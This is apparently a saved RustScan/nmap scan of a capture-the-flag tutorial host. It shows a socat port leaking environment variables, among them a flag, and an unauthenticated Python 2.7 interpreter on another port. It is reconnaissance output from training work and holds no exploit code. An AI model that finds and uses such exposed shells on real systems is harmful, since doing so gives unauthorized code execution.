# results rutscan
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 63 nginx 1.10.3
|_http-server-header: nginx/1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: tutorial-101.echocity-f.com
60123/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
|     _=/usr/bin/socat
|     HOSTNAME=tutorial-101.echocity-f.com
|     PWD=/var/www/html
|     HOME=/root
|     TMUX=/tmp/tmux-0/default,55,0
|     DEBIAN_FRONTEND=noninteractive
|     SHELL=/bin/bash
|     TERM=screen
|     TMUX_PANE=%0
|     SHLVL=2
|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
|     SOCAT_PID=8726
|     SOCAT_PPID=58
|     SOCAT_VERSION=1.7.3.1
|     SOCAT_SOCKADDR=10.0.100.11
|     SOCAT_SOCKPORT=60123
|     SOCAT_PEERADDR=10.10.0.222
|     SOCAT_PEERPORT=42362
|   GetRequest: 
|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
|     _=/usr/bin/socat
|     HOSTNAME=tutorial-101.echocity-f.com
|     PWD=/var/www/html
|     HOME=/root
|     TMUX=/tmp/tmux-0/default,55,0
|     DEBIAN_FRONTEND=noninteractive
|     SHELL=/bin/bash
|     TERM=screen
|     TMUX_PANE=%0
|     SHLVL=2
|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
|     SOCAT_PID=8728
|     SOCAT_PPID=58
|     SOCAT_VERSION=1.7.3.1
|     SOCAT_SOCKADDR=10.0.100.11
|     SOCAT_SOCKPORT=60123
|     SOCAT_PEERADDR=10.10.0.222
|     SOCAT_PEERPORT=42364
|   HTTPOptions: 
|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
|     _=/usr/bin/socat
|     HOSTNAME=tutorial-101.echocity-f.com
|     PWD=/var/www/html
|     HOME=/root
|     TMUX=/tmp/tmux-0/default,55,0
|     DEBIAN_FRONTEND=noninteractive
|     SHELL=/bin/bash
|     TERM=screen
|     TMUX_PANE=%0
|     SHLVL=2
|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
|     SOCAT_PID=8730
|     SOCAT_PPID=58
|     SOCAT_VERSION=1.7.3.1
|     SOCAT_SOCKADDR=10.0.100.11
|     SOCAT_SOCKPORT=60123
|     SOCAT_PEERADDR=10.10.0.222
|     SOCAT_PEERPORT=42376
|   NULL: 
|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
|     _=/usr/bin/socat
|     HOSTNAME=tutorial-101.echocity-f.com
|     PWD=/var/www/html
|     HOME=/root
|     TMUX=/tmp/tmux-0/default,55,0
|     DEBIAN_FRONTEND=noninteractive
|     SHELL=/bin/bash
|     TERM=screen
|     TMUX_PANE=%0
|     SHLVL=2
|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
|     SOCAT_PID=8722
|     SOCAT_PPID=58
|     SOCAT_VERSION=1.7.3.1
|     SOCAT_SOCKADDR=10.0.100.11
|     SOCAT_SOCKPORT=60123
|     SOCAT_PEERADDR=10.10.0.222
|     SOCAT_PEERPORT=42350
|   RTSPRequest: 
|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
|     _=/usr/bin/socat
|     HOSTNAME=tutorial-101.echocity-f.com
|     PWD=/var/www/html
|     HOME=/root
|     TMUX=/tmp/tmux-0/default,55,0
|     DEBIAN_FRONTEND=noninteractive
|     SHELL=/bin/bash
|     TERM=screen
|     TMUX_PANE=%0
|     SHLVL=2
|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
|     SOCAT_PID=8732
|     SOCAT_PPID=58
|     SOCAT_VERSION=1.7.3.1
|     SOCAT_SOCKADDR=10.0.100.11
|     SOCAT_SOCKPORT=60123
|     SOCAT_PEERADDR=10.10.0.222
|_    SOCAT_PEERPORT=42380
60321/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
|     [GCC 6.3.0 20170516] on linux2
|     Type "help", "copyright", "credits" or "license" for more information.
|   GetRequest: 
|     GET / HTTP/1.0
|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
|     [GCC 6.3.0 20170516] on linux2
|     Type "help", "copyright", "credits" or "license" for more information.
|     HTTP/1.0
|     Traceback (most recent call last):
|     File "<stdin>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions: 
|     OPTIONS / HTTP/1.0
|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
|     [GCC 6.3.0 20170516] on linux2
|     Type "help", "copyright", "credits" or "license" for more information.
|     OPTIONS / HTTP/1.0
|     Traceback (most recent call last):
|     File "<stdin>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   RTSPRequest: 
|     OPTIONS / RTSP/1.0
|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
|     [GCC 6.3.0 20170516] on linux2
|     Type "help", "copyright", "credits" or "license" for more information.
|     OPTIONS / RTSP/1.0
|     Traceback (most recent call last):
|     File "<stdin>", line 1, in <module>
|_    NameError: name 'OPTIONS' is not defined
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60123-TCP:V=7.93%I=7%D=2/5%Time=63DFBBBB%P=x86_64-redhat-linux-gnu%
SF:r(NULL,1C2,"ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag\n_=/usr/bin/soc
SF:at\nHOSTNAME=tutorial-101\.echocity-f\.com\nPWD=/var/www/html\nHOME=/ro
SF:ot\nTMUX=/tmp/tmux-0/default,55,0\nDEBIAN_FRONTEND=noninteractive\nSHEL
SF:L=/bin/bash\nTERM=screen\nTMUX_PANE=%0\nSHLVL=2\nPATH=/usr/local/sbin:/
SF:usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSOCAT_PID=8722\nSOCAT_PPID
SF:=58\nSOCAT_VERSION=1\.7\.3\.1\nSOCAT_SOCKADDR=10\.0\.100\.11\nSOCAT_SOC
